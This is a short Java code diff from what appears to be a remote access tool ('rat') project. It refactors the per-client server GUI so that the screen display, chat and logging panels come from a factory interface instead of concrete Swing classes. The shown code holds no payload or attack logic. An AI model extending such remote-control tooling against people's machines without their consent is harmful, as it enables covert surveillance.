@@ -8,9 +8,6 @@ import javax.swing.ImageIcon;
 
 import de.sogomn.engine.util.AbstractListenerContainer;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.gui.swing.ChatSwingGui;
-import de.sogomn.rat.gui.swing.DisplayPanel;
-import de.sogomn.rat.gui.swing.LoggingGui;
 
 public final class ServerClient extends AbstractListenerContainer<IGuiController> implements IGuiController {
 	
@@ -22,18 +19,18 @@ public final class ServerClient extends AbstractListenerContainer<IGuiController
 	private long ping;
 	
 	final ActiveConnection connection;
-	final DisplayPanel displayPanel;
+	final IDisplayGui displayPanel;
 	final IFileBrowserGui fileBrowser;
-	final ChatSwingGui chat;
-	final LoggingGui logger;
+	final IChatGui chat;
+	final ILoggingGui logger;
 	
 	ServerClient(final ActiveConnection connection, final IRattyGuiFactory guiFactory) {
 		this.connection = connection;
 		
-		displayPanel = new DisplayPanel();
+		displayPanel = guiFactory.createDisplayGui();
 		fileBrowser = guiFactory.createFileBrowserGui();
-		chat = new ChatSwingGui();
-		logger = new LoggingGui();
+		chat = guiFactory.createChatGui();
+		logger = guiFactory.createLoggingGui();
 	}
 	
 	@Override
